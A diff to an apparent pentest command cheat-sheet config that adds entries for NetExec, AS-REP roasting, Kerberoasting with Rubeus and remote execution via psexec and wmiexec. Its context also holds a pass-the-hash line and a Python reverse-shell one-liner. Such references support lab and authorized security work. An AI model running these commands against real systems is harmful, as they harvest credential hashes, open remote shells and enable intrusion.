@@ -394,6 +394,15 @@ examples = [
     "crackmapexec smb ips.txt -u user -H <NTHASH> --shares"
 ]
 
+[command.NetExec]
+name_exe = "netexec"
+cmd_types = "pentest"
+explanation = "Show access on list of machines"
+args = "smb <ipsfile|ips.txt> -u <username> -p <password|password>"
+examples = [
+    "netexec smb ips.txt -u user -p 'password' -d corp.com"
+]
+
 [command.SMBClient-0]
 name_exe = "smbclient.py"
 cmd_types = "pentest"
@@ -447,6 +456,50 @@ examples = [
     "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 ]
 
+[command.GetNPUsers]
+name_exe = "impacket-GetNPUsers"
+cmd_types = "pentest|network"
+explanation = "Request TGT from DC to later crack it. Only works if Kerberos pre-authentication is not activated!"
+args = "-dc-ip <dc-ip|127.0.0.1>  -request -outputfile <outputfile|hashes-asrep.roast> <domain|corp.com/user>"
+examples = [
+    "impacket-GetNPUsers -dc-ip 127.0.0.1  -request -outputfile hashes-asrep.roast corp.com/user"
+]
+
+[command.Rubeus]
+name_exe = "Rubeus.exe"
+cmd_types = "pentest|network"
+explanation = "Request a TGS and try to crack the service account password"
+args = ".\\Rubeus.exe kerberoast /outfile:<outfile|hashes.kerberoast>"
+examples = [
+    ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
+]
+
+[command.PsExec-Impacket]
+name_exe = "psexec.py"
+cmd_types = "pentest"
+explanation = "PsExec info"
+args = "'<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
+examples = [
+    "psexec.py 'corp.com/user:password@127.0.0.1'"
+]
+
+[command.WMIExec-Impacket]
+name_exe = "wmiexec.py"
+cmd_types = "pentest"
+explanation = "WMIExec info"
+args = "'<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
+examples = [
+    "wmiexec.py 'corp.com/user:password@127.0.0.1'"
+]
+
+[command.PsExec-Windows]
+name_exe = "./PsExec64.exe"
+cmd_types = "pentest"
+explanation = "PsExec info"
+args = "-i  \\\\<machine|127.0.0.1> -u <username|corp\\jen> -p <password|password> cmd"
+examples = [
+    "./PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd"
+]
 
 # ===== REVERSE COMMANDS =====
 # ============================ #
